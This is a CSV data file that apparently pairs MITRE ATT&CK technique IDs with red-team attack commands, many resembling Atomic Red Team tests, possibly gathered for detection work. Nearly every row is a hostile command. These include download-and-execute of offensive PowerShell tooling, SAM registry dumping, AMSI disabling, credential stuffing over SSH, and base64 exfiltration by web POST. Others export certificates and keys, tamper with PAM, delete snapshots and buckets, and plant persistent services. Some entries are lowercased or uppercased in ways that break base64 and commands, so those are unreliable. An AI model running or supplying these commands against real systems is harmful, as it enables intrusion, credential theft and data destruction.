mitre_id,command
T1047,wmic process call create #{process_to_execute} # id_4042
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-beacon.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime} # id_3115"
T1136,kubectl run #{pod_name} --image=#{image_name} --restart=never --rm -it -- sh -lc 'adduser -d #{username} && id #{username}'
T1136,"net user ""#{username}"" ""#{password}"" /add /domain   "
T1053,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '#{at_command}' | at #{time_spec} && at -l"""
T1018,ip route show  
T1486,"set-content -path ""#{file_to_encrypt_location}"" -value ""populating this file with some text"" # create the test.txt file again in case prereqs failed cmd /c ""`""c:\program files (x86)\gnupg\bin\gpg.exe`"" --passphrase 'someparaphraseblah' --batch --yes -c `""#{file_to_encrypt_location}`""""   "
T1486,which_ccencrypt=`which ccencrypt` cp #{root_input_file_path} #{cped_file_path}; $which_ccencrypt -t -k #{pwd_for_encrypted_file} #{cped_file_path} 
T1556,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystem.ps1')
T1614,pathtoatomicsfolder\..\externalpayloads\languagekeyboardlayout.exe # id_3707
T1558,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') kerberoasting -consoleoutput -noninteractive
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" "
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } } # id_5380"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f   "
T1505,"install-transportagent -name #{transport_agent_identity} -transportagentfactory #{class_factory} -assemblypath #{dll_path} enable-transportagent #{transport_agent_identity} get-transportagent | format-list name,enabled"
T1489,taskkill.exe /f /im #{process_name} 
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file}
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" # id_5144"
T1016,test-netconnection -computername #{target}
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close() # id_4000"
T1555,"start-process ""#{webbrowserpassview_path}"" start-sleep -second 4 stop-process -name ""webbrowserpassview"""
T1652,KEXTSTAT
T1528,"AZ LOGIN # LOG IN TO AZURE CLI $ALLOWSHAREDKEYACCESS = AZ STORAGE ACCOUNT SHOW --NAME ""#{STORAGE_ACCOUNT_NAME}"" --QUERY ""ALLOWSHAREDKEYACCESS"" IF ($ALLOWSHAREDKEYACCESS -EQ ""FALSE"") { # $ALLOWSHAREDKEYACCESS COULD BE TRUE OR NULL WRITE-OUTPUT ""SHARED KEY ACCESS IS DISABLED FOR THIS STORAGE ACCOUNT."" } ELSE { $CONNECTIONSTRING = AZ STORAGE ACCOUNT SHOW-CONNECTION-STRING --NAME ""#{STORAGE_ACCOUNT_NAME}"" --QUERY CONNECTIONSTRING --OUTPUT TSV # DOWNLOAD BLOB FOR CLEANUP $TMPORIGINALFUNCTIONCODE = JOIN-PATH $ENV:TEMP/ (""T1528_TMP_ORIGINAL_"" + ""#{BLOB_NAME}"") AZ STORAGE BLOB DOWNLOAD --CONNECTION-STRING $CONNECTIONSTRING --CONTAINER-NAME ""#{CONTAINER_NAME}"" --NAME ""#{BLOB_NAME}"" --FILE $TMPORIGINALFUNCTIONCODE --OVERWRITE TRUE IF ($LASTEXITCODE -EQ 0) { # UPLOAD NEW BLOB VERSION IF DOWNLOAD OF EXISTING BLOB SUCCEEDED AZ STORAGE BLOB UPLOAD --CONNECTION-STRING $CONNECTIONSTRING --CONTAINER-NAME ""#{CONTAINER_NAME}"" --NAME ""#{BLOB_NAME}"" --FILE ""#{FILE_PATH_BLOB}"" --OVERWRITE TRUE } ELSE { WRITE-OUTPUT ""DOWNLOAD ORIGINAL FUNCTION CODE FAILED."" EXIT 1 } }"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } }"
T1110,"cp $pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done "
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } } # id_2585"
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1490,sudo tmutil disable
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region "
T1572,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }"
T1528,"AZ LOGIN # LOG IN TO AZURE CLI $ALLOWSHAREDKEYACCESS = AZ STORAGE ACCOUNT SHOW --NAME ""#{STORAGE_ACCOUNT_NAME}"" --QUERY ""ALLOWSHAREDKEYACCESS"" IF ($ALLOWSHAREDKEYACCESS -EQ ""FALSE"") { # $ALLOWSHAREDKEYACCESS COULD BE TRUE OR NULL WRITE-OUTPUT ""SHARED KEY ACCESS IS DISABLED FOR THIS STORAGE ACCOUNT."" } ELSE { # DOWNLOAD FILE FOR CLEANUP $TMPORIGINALFILENAME = [SYSTEM.IO.PATH]::GETFILENAME(""#{FILE_PATH}"") $TMPORIGINALFUNCTIONCODE = JOIN-PATH $ENV:TEMP/ (""T1528_TMP_ORIGINAL_"" + $TMPORIGINALFILENAME) AZ STORAGE FILE DOWNLOAD --ACCOUNT-NAME ""#{STORAGE_ACCOUNT_NAME}"" --SHARE-NAME ""#{FILE_SHARE_NAME}"" -P ""#{FILE_PATH}"" --ONLY-SHOW-ERRORS --DEST $TMPORIGINALFUNCTIONCODE IF ($LASTEXITCODE -EQ 0) { # UPLOAD NEW FUNCITON CODE IF DOWNLOAD OF EXISTING CODE SUCCEEDED IF (""#{EXECUTION_OPTION}"" -EQ ""INSERT_CODE"") { # DOWNLOAD FILE FROM FILE SHARE FOR INJECTION $TMPFUNCTIONCODE = JOIN-PATH $ENV:TEMP/ (""T1528_TMP_TO_INJECT_"" + $TMPORIGINALFILENAME) AZ STORAGE FILE DOWNLOAD --ACCOUNT-NAME ""#{STORAGE_ACCOUNT_NAME}"" --SHARE-NAME ""#{FILE_SHARE_NAME}"" -P ""#{FILE_PATH}"" --ONLY-SHOW-ERRORS --DEST $TMPFUNCTIONCODE IF ($LASTEXITCODE -NE 0) { WRITE-OUTPUT ""FUNCTION CODE DOWNLOAD FAILED."" EXIT 1 } WRITE-OUTPUT ""FILE DOWNLOADED: $($TMPFUNCTIONCODE)"" $INSERTCONTENT = GET-CONTENT -PATH ""#{CODE_TO_INSERT_PATH}"" -RAW # LOAD THE CONTENT OF THE INSERT FILE $CONTENT = GET-CONTENT -PATH $TMPFUNCTIONCODE -RAW # INJECT CODE TO FILE $CONTENT = $INSERTCONTENT + ""`N"" + $CONTENT # INSERT THE NEW CODE AT THE BEGINNING $CONTENT | SET-CONTENT -PATH $TMPFUNCTIONCODE # WRITE THE MODIFIED CONTENT TO THE FILE # UPLOAD FILE TO FILE SHARE AZ STORAGE FILE UPLOAD --ACCOUNT-NAME ""#{STORAGE_ACCOUNT_NAME}"" --SHARE-NAME ""#{FILE_SHARE_NAME}"" -P ""#{FILE_PATH}"" --SOURCE $TMPFUNCTIONCODE --ONLY-SHOW-ERRORS IF ($LASTEXITCODE -NE 0) { WRITE-OUTPUT ""FUNCTION CODE UPLOAD FAILED."" EXIT 1 } WRITE-OUTPUT ""UPLOADED THE TAMPERED FILE"" } ELSEIF (""#{EXECUTION_OPTION}"" -EQ ""REPLACE_FILE"") { AZ STORAGE FILE UPLOAD --ACCOUNT-NAME ""#{STORAGE_ACCOUNT_NAME}"" --SHARE-NAME ""#{FILE_SHARE_NAME}"" -P ""#{FILE_PATH}"" --SOURCE ""#{CODE_TO_INSERT_PATH}"" --ONLY-SHOW-ERRORS IF ($LASTEXITCODE -NE 0) { WRITE-OUTPUT ""FUNCTION CODE UPLOAD FAILED."" EXIT 1 } WRITE-OUTPUT ""UPLOADED THE TAMPERED FILE"" } ELSE { WRITE-OUTPUT ""PLEASE CHOOSE A VALID EXECUTION_OPTION"" EXIT 1 } } ELSE { WRITE-OUTPUT ""DOWNLOAD ORIGINAL FUNCTION CODE FAILED."" EXIT 1 } }"
T1127,"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-domain-length.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} # id_6819"
T1485,"ECHO """" | ""#{PLINK_FILE}"" -BATCH ""#{VM_HOST}"" -SSH -L #{VM_USER} -PW ""#{VM_PASS}"" ""FOR I IN `VIM-CMD VMSVC/GETALLVMS | AWK 'NR>1 {PRINT $1}'`; DO VIM-CMD VMSVC/SNAPSHOT.REMOVEALL $I & DONE"""
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive   
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1547,"set-itemproperty ""hklm:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" ""stubpath"" ""#{payload}"" -force & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct
T1556,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1526,"IMPORT-MODULE ""PATHTOATOMICSFOLDER\T1526\SRC\AWSDISCOVERY.PS1"" $ACCESS_KEY = ""#{ACCESS_KEY}"" $SECRET_KEY = ""#{SECRET_KEY}"" $SESSION_TOKEN = ""#{SESSION_TOKEN}"" $AWS_PROFILE = ""#{PROFILE}"" $REGIONS = ""#{REGIONS}"" SET-AWSAUTHENTICATION -ACCESSKEY $ACCESS_KEY -SECRETKEY $SECRET_KEY -SESSIONTOKEN $SESSION_TOKEN -AWSPROFILE $AWS_PROFILE GET-AWSDISCOVERYDATA -REGIONS $REGIONS -OUTPUTDIRECTORY ""#{OUTPUT_DIRECTORY}"" REMOVE-BLANKFILES -OUTPUTDIRECTORY ""#{OUTPUT_DIRECTORY}"""
T1562,"new-item -path ""hkcu:\software\microsoft\windows script\settings"" -force | out-null new-itemproperty -path ""hkcu:\software\microsoft\windows script\settings"" -name ""amsienable"" -value 0 -propertytype dword -force | out-null"
T1652,kextfind # id_5113
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer # id_1978"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_4268
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}
T1053,"[NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 IEX (IWR ""HTTPS://RAW.GITHUBUSERCONTENT.COM/REDCANARYCO/ATOMIC-RED-TEAM/MASTER/ATOMICS/T1204.002/SRC/INVOKE-MALDOC.PS1"" -USEBASICPARSING) INVOKE-MALDOC -MACROFILE ""PATHTOATOMICSFOLDER\T1053.005\SRC\T1053.005-MACROCODE.TXT"" -OFFICEPRODUCT ""#{MS_PRODUCT}"" -SUB ""SCHEDULER"""
T1217,"$url_regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $history = get-content -path ""#{history_path}"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""#{dest_path}"""
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1574,ld_preload=#{path_to_shared_library} ls # id_7777
T1140,"encoded=$(perl -e ""use mime::base64;print(encode_base64('#{message}'));"") perl -le ""use mime::base64;print(decode_base64('$encoded'));"" echo $encoded | perl -le 'use mime::base64;print(decode_base64(<stdin>));' echo $encoded > #{encoded_file} && perl -le 'use mime::base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'"
T1560,"""#{rar_exe}"" a -r #{output_file} #{input_path}\*#{file_extension}"
T1057,tasklist
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"" # id_8233"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"" # id_6729"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnetsearch -noninteractive -consoleoutput
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"" # id_3702"
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1543,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name} "
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1543,"echo ""#!/bin/bash"" > /etc/init.d/t1543.002 echo ""### begin init info"" >> /etc/init.d/t1543.002 echo ""# provides : atomic test t1543.002"" >> /etc/init.d/t1543.002 echo ""# required-start: \$all"" >> /etc/init.d/t1543.002 echo ""# required-stop : "" >> /etc/init.d/t1543.002 echo ""# default-start: 2 3 4 5"" >> /etc/init.d/t1543.002 echo ""# default-stop: "" >> /etc/init.d/t1543.002 echo ""# short description: atomic test for systemd service creation"" >> /etc/init.d/t1543.002 echo ""### end init info"" >> /etc/init.d/t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibdcmvhdgluzybtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllmnyzwf0aw9ujykk')) \"" "" >> /etc/init.d/t1543.002 chmod +x /etc/init.d/t1543.002 if [ $(cat /etc/os-release | grep -i id=ubuntu) ] || [ $(cat /etc/os-release | grep -i id=kali) ]; then update-rc.d t1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'id=""centos""') ]; then chkconfig t1543.002 on ; else echo ""please run this test on ubnutu , kali or centos"" ; fi systemctl enable t1543.002 systemctl start t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgysbtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllm1vzglmawnhdglvbicpcg=='))\"""" | sudo tee -a /etc/init.d/t1543.002 systemctl daemon-reload systemctl restart t1543.002 # id_9820"
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" "
T1048,"$rclone_bin = get-childitem c:\users\public\downloads\ -recurse -include ""rclone.exe"" | select-object -expandproperty fullname $exfil_pack = get-childitem c:\users\public\downloads\ -recurse -include ""exfil.zip"" | select-object -expandproperty fullname &$rclone_bin config create ftpserver ""ftp"" ""host"" #{ftp_server} ""port"" #{ftp_port} ""user"" #{ftp_user} ""pass"" #{ftp_pass} &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2m -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -p --ftp-no-check-certificate # id_4880"
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file} # id_2940"
T1003,reg save HKLM\SAM C:\Users\Public\dump.tmp
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } }"
T1202,"scriptrunner.exe -appvscript ""#{payload_path}"""
T1552,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing) certutil.exe -p #{password} -exportpfx root 1f3d38f280635f275be92b87cf83e40e40458400 #{output}
T1132,ECHO -N 111-11-1111 | B64ENCODE -R - CURL -XPOST #{BASE64_DATA}.#{DESTINATION_URL}
T1518,wmic.exe /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list # id_8561
T1552,mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \; # id_7572
T1124,time
T1036,"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\t1036.004_nonexistingscript.ps1"" /tn win32times /f schtasks /query /tn win32times  "
